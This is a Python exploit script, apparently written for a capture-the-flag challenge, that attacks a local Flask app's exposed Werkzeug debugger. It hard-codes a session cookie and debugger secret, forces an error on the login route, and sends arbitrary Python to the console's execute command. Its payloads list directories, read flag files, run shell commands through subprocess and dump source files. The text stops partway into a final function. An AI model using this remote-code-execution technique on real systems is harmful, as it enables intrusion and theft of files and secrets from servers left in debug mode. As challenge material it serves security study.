import requests
import re
import urllib.parse
import html

BASE_URL = "http://127.0.0.1:5003"
SESSION_COOKIE = ".eJwlTstqwzAQ_BWx51Cst-Sv6L2EsJZmY4PbFMs5hfx7F3oa5sm86CY7jxWD5q8XmVOBvjEG30EX-tzBA2Z_3M32Y86H4dbUNOe6DfOrmQ-6vq8XHTkwVprP4wllW6eZandSI3oCCy8MnqKPUoMU26dgpQPcXJhqVsMFgeXInUOISBXF55jES2jagbSaknNoPi8uoTW_5OoXUb0Um3KIMulyh5cktfuYuej923Pg-H9j6f0Hj05H0g.aVsUEw.pzEXTKPJRkglOFBxL9YRXm0BK1c"
SECRET = "YKhX0CLt5PHAxuDtcFOy"

def get_session():
    session = requests.Session()
    session.cookies.set("session", SESSION_COOKIE, domain="127.0.0.1", path="/")
    return session

def trigger_debugger():
    """Trigger the debugger with a proper error"""
    print("[*] Triggering application error...")
    
    session = get_session()
    
    # Trigger a real application error (KeyError for missing username/password)
    resp = session.post(
        f"{BASE_URL}/login",
        data={"invalid_field": "value"},
        allow_redirects=False,
        timeout=15
    )
    
    print(f"Status: {resp.status_code}")
    print(f"Content length: {len(resp.text)}")
    
    # Save full response for analysis
    with open('/tmp/debugger_response.html', 'w') as f:
        f.write(resp.text)
    
    return resp.text, session

def extract_debugger_context(html_content):
    """Extract debugger context (tb, frame, etc.) from error page"""
    print("\n[*] Extracting debugger context...")
    
    # Look for the interactive console link/inclusion
    # Werkzeug debugger includes console in an iframe with specific parameters
    
    # Look for traceback id
    tb_match = re.search(r'tb=([0-9]+)', html_content)
    if tb_match:
        tb_id = tb_match.group(1)
        print(f"[+] Found traceback ID: {tb_id}")
    else:
        tb_id = "0"
        print(f"[-] No traceback ID found, using default: {tb_id}")
    
    # Look for console frame
    console_matches = re.findall(r'console[^\"\'\s]+', html_content)
    if console_matches:
        print(f"[+] Found console references:")
        for match in console_matches[:3]:
            print(f"  - {match}")
    
    # The console is typically at /console with the traceback context
    console_url = f"/console?__debugger__=yes&cmd=resource&f=console.html&t={tb_id}"
    print(f"[+] Constructed console URL: {console_url}")
    
    return tb_id, console_url

def access_debugger_console(session, tb_id):
    """Access the debugger console with proper parameters"""
    print(f"\n[*] Accessing debugger console (tb={tb_id})...")
    
    # The console is accessed with the traceback context
    console_url = f"{BASE_URL}/console"
    params = {
        "__debugger__": "yes",
        "t": tb_id
    }
    
    print(f"Console URL: {console_url}")
    print(f"Parameters: {params}")
    
    resp = session.get(console_url, params=params, timeout=15)
    
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type', 'unknown')}")
    
    if resp.status_code == 200:
        # Look for EVALEX and SECRET
        evalex_match = re.search(r'EVALEX\s*=\s*(true|false)', resp.text)
        secret_match = re.search(r'SECRET\s*=\s*[\"\']([^\"\']+)[\"\']', resp.text)
        
        if evalex_match:
            evalex = evalex_match.group(1)
            print(f"[+] EVALEX enabled: {evalex}")
        
        if secret_match:
            secret = secret_match.group(1)
            print(f"[+] SECRET found: {secret}")
            return secret
        else:
            print(f"[-] SECRET not in console, using known secret: {SECRET}")
            return SECRET
    
    return None

def execute_in_debugger(session, tb_id, secret, code):
    """Execute code in the debugger console"""
    print(f"\n[*] Executing code in debugger...")
    
    execute_url = f"{BASE_URL}/console"
    params = {
        "__debugger__": "yes",
        "cmd": "execute",
        "frm": "0",  # Frame 0 is usually the application frame
        "t": tb_id,
        "s": secret,
        "code": code
    }
    
    print(f"Executing: {code}")
    print(f"Full URL: {execute_url}?{urllib.parse.urlencode(params)}")
    
    resp = session.get(execute_url, params=params, timeout=20)
    
    print(f"Status: {resp.status_code}")
    print(f"Response preview: {resp.text[:500]}")
    
    # Werkzeug debugger typically returns a special response
    # The actual output goes to the browser console, but we can check for errors
    if resp.status_code == 200:
        if "Traceback" in resp.text:
            print("[-] Execution error occurred")
            return False
        elif "<div class=\"output\">" in resp.text:
            # Look for output div
            output_match = re.search(r'<div class=\"output\">(.*?)</div>', resp.text, re.DOTALL)
            if output_match:
                output = output_match.group(1)
                print(f"[+] Raw output: {output[:200]}")
                return True
        else:
            # Might be working, hard to tell from HTTP response
            print("[?] Execution completed (check response for output)")
            return True
    
    return False

def search_flag():
    """Main exploit function to search for flag"""
    print("Werkzeug Debugger Exploitation")
    print("=" * 60)
    
    # Step 1: Trigger debugger
    error_html, session = trigger_debugger()
    
    if not error_html:
        print("[-] Failed to trigger debugger")
        return
    
    # Step 2: Extract context
    tb_id, console_url = extract_debugger_context(error_html)
    
    # Step 3: Get secret
    secret = access_debugger_console(session, tb_id)
    
    if not secret:
        print("[-] Could not access console, trying direct execution...")
        secret = SECRET
    
    print(f"\n[*] Using secret: {secret}")
    
    # Step 4: Execute code to find flag
    print("\n" + "=" * 60)
    print("SEARCHING FOR FLAG")
    print("=" * 60)
    
    commands = [
        # Test execution
        "print('test')",
        
        # Find current directory and files
        "import os; print('CWD:', os.getcwd()); print('FILES:', os.listdir('.'))",
        
        # Look for flag in current directory
        "import os; print([f for f in os.listdir('.') if 'flag' in f.lower()])",
        
        # Read flag.txt if it exists
        "import os; print(open('flag.txt').read()) if os.path.exists('flag.txt') else print('no flag.txt')",
        
        # Read FLAG.txt if it exists  
        "import os; print(open('FLAG.txt').read()) if os.path.exists('FLAG.txt') else print('no FLAG.txt')",
        
        # Check parent directory
        "import os; print('PARENT:', os.listdir('..'))",
        
        # Try common locations
        "import os; paths=['flag.txt','FLAG.txt','../flag.txt','../../flag.txt']; [print(p, ':', open(p).read()[:50]) for p in paths if os.path.exists(p)]",
        
        # Execute shell commands to find flag
        "import subprocess; print(subprocess.run(['ls', '-la'], capture_output=True, text=True).stdout[:200])",
        
        # Find all files recursively (limited)
        "import os; [print(os.path.join(r,f)) for r,d,files in os.walk('.') for f in files if 'flag' in f.lower()][:5]",
        
        # Read Python files to find flag embedded in code
        "import os; files=[f for f in os.listdir('.') if f.endswith('.py')]; [print(open(f).read()) for f in files if 'FLAG' in open(f).read()]"
    ]
    
    for cmd in commands:
        print(f"\n[*] Executing: {cmd[:60]}...")
        if execute_in_debugger(session, tb_id, secret, cmd):
            print("[+] Command appeared to execute")
        else:
            print("[-] Command failed")
        print("-" * 40)

def direct_console_access():
    """Try accessing console directly without error trigger"""
    print("\n" + "=" * 60)
